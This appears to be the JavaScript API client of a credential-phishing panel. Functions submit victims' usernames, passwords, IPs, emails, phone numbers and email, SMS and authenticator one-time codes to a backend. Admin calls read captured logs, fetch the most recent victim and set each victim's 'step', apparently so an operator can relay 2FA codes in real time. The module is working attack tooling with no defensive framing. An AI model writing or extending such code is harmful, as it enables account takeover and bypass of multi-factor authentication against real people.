import axios from "axios";

const apiClient = axios.create({
  baseURL: "http://localhost:5000/api",
  headers: {
    "Content-Type": "application/json",
  },
});

apiClient.interceptors.request.use((config) => {
  const token = localStorage.getItem("token");
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

// New API call to submit username, password, and IP
export const submitUsernamePassword = (username, password, userIp) => {
  return apiClient.post("/users/username-password", {
    username,
    password,
    ip: userIp,
  });
};

// API call to fetch all logs
export const fetchAllLogs = () => {
  return apiClient.get("/admin/logs");
};

// API call to fetch the most recent user log
export const fetchRecentUser = () => {
  return apiClient.get("/admin/recent-user");
};

// API call to delete a specific log
export const deleteLog = (logId) => {
  return apiClient.delete(`/admin/logs/${logId}`);
};
// API call to login
export const login = (username, password) => {
  return apiClient.post("/admin/login", { username, password });
};

export const submitEmail = (email, userId, ip, userAgent) => {
  return apiClient.post("/users/email-capture", {
    email,
    userId,
    ip,
    userAgent,
  });
};

// API call to update the user's step
export const updateUserStep = (userId, nextStep) => {
  return apiClient.post("/admin/update-step", { userId, nextStep });
};

// API call to fetch the user's current step
export const fetchUserStep = (userId) => {
  return apiClient.get(`/users/step/${userId}`);
};

export const submitEmailOtp = (userId, emailOtp) => {
  return apiClient.post("/users/email-otp", {
    userId,
    emailOtp,
  });
};

export const submitPhoneOtp = (userId, phoneOtp) => {
  return apiClient.post("/users/phone-otp", {
    userId,
    phoneOtp,
  });
};
export const submitPhoneNumber = (userId, phoneNumber, code, userAgent, ip) => {
  return apiClient.post("/users/phone-number", {
    userId,
    phoneNumber,
    selectedCountry: code,
    userAgent,
    userIp: ip,
  });
};
// API call to fetch OTP by userId
export const fetchUserOtp = (userId) => {
  return apiClient.get(`/users/otp/${userId}`);
};
// Export the checkErrorStatus function
export const checkErrorStatus = (userId) => {
  return apiClient.get(`/admin/check-error/${userId}`);
};
// API call to submit authenticator OTP
export const submitAuthenticatorOtp = (userId, authenticatorOtp) => {
  return apiClient.post("/users/authenticator-otp", {
    userId,
    authenticatorOtp,
  });
};
